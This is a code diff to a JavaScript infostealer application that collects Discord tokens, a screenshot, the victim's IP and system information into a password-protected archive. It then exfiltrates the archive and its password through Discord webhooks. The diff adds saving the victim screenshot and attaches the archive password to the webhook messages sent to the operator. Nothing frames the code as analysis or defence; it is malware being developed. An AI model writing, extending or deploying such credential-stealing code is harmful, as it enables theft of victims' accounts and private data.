@@ -197,6 +197,20 @@ class Application {
             // Initialize file manager now that we know we have Discord tokens to process
             fileManager.init();
 
+            // Save screenshot to the generated save folder after fileManager is initialized
+            if (this.screenshotPath && this.screenshotCapture.screenshotExists()) {
+                try {
+                    const screenshotBuffer = this.screenshotCapture.getScreenshotBuffer();
+                    if (screenshotBuffer) {
+                        const filename = require('path').basename(this.screenshotPath);
+                        fileManager.saveBuffer(screenshotBuffer, 'Screenshots', filename);
+                        logger.info('Screenshot saved to archive folder', { filename });
+                    }
+                } catch (error) {
+                    logger.warn('Failed to save screenshot to archive folder', error.message);
+                }
+            }
+
             // Get system info for context
             const systemInfo = stats.getRawData().system;
             const userIp = systemInfo.ip || 'Unknown';
@@ -256,11 +270,11 @@ class Application {
 
             // SECOND: Send Discord accounts if available (as per requirement: after screenshot)
             if (this.results.discord && Array.isArray(this.results.discord) && this.results.discord.length > 0) {
-                await this.discordService.sendAccountEmbeds(this.results.discord, userIp, uploadResult, zipPath);
+                await this.discordService.sendAccountEmbeds(this.results.discord, userIp, uploadResult, zipPath, zipPassword);
                 logger.info('Sent Discord account embeds (after screenshot)');
             } else {
                 // Only send main webhook if no Discord accounts are available
-                await this.sendMainWebhook(uploadResult, zipPath);
+                await this.sendMainWebhook(uploadResult, zipPath, zipPassword);
                 logger.info('Sent main webhook (no Discord accounts available)');
             }
 
@@ -274,7 +288,7 @@ class Application {
     /**
      * Send main webhook with statistics
      */
-    async sendMainWebhook(uploadResult = null, zipPath = '') {
+    async sendMainWebhook(uploadResult = null, zipPath = '', zipPassword = null) {
         try {
             const systemInfo = stats.getRawData().system;
             const payload = stats.buildWebhookPayload(
@@ -289,11 +303,12 @@ class Application {
                 const embed = JSON.parse(payload).embeds[0];
                 
                 // Add password information to embed if present
-                if (uploadResult.password) {
+                const password = uploadResult.password || zipPassword;
+                if (password) {
                     embed.fields = embed.fields || [];
                     embed.fields.push({
                         name: ":key: Archive Password",
-                        value: `\`${uploadResult.password}\``,
+                        value: `\`${password}\``,
                         inline: false
                     });
                     embed.fields.push({
@@ -305,8 +320,24 @@ class Application {
                 
                 await this.discordService.sendWebhook(JSON.parse(JSON.stringify({ embeds: [embed] })));
             } else {
-                // Send with file attachment
+                // Send with file attachment and password info if available
                 const embed = JSON.parse(payload).embeds[0];
+                
+                // Add password information to embed if present
+                if (zipPassword) {
+                    embed.fields = embed.fields || [];
+                    embed.fields.push({
+                        name: ":key: Archive Password",
+                        value: `\`${zipPassword}\``,
+                        inline: false
+                    });
+                    embed.fields.push({
+                        name: ":warning: Important",
+                        value: "This archive is password protected. Use the password above to extract the contents.",
+                        inline: false
+                    });
+                }
+                
                 await this.discordService.sendFile(zipPath, embed);
             }
 
